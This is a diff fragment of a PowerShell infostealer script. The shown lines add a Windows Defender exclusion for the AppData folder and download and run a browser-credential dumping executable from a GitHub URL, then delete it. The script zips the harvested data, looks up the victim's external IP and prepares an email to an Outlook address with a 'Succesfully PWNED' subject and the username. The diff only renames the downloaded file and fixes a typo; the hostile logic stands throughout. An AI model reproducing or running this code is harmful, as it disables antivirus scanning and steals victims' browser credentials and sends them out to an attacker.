@@ -7,10 +7,10 @@ Add-MpPreference -ExclusionPath "$env:appdata"
 mkdir "$env:appdata\dump"
 Set-Location "$env:appdata\dump"
 #Downloading and executing hackbrowser.exe
-Invoke-WebRequest -Uri "https://github.com/user337666/brow666/raw/main/abc.exe" -OutFile "$env:appdata\dump\abc.exe"
-./abc.exe
+Invoke-WebRequest -Uri "https://github.com/user337666/brow666/raw/main/browser.exe" -OutFile "$env:appdata\dump\hb.exe"
+./hb.exe
 Start-Sleep -Seconds 6
-Remove-Item -Path "$env:appdata\dump\abc.exe" -Force
+Remove-Item -Path "$env:appdata\dump\hb.exe" -Force
 #Creating A Zip Archive
 Compress-Archive -Path * -DestinationPath dump.zip
 $Random = Get-Random
@@ -22,7 +22,7 @@ $smtp.EnableSsl = $true
 $Message.From = "browser-666@outlook.com"
 $Message.To.Add("browser-666@outlook.com")
 $ip = Invoke-RestMethod "myexternalip.com/raw"
-$Message.Subject = "Succesfully PWED " + $env:USERNAME + "! (" + $ip + ")"
+$Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
 $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
 $Message.Body = $ComputerName
 $files=Get-ChildItem 
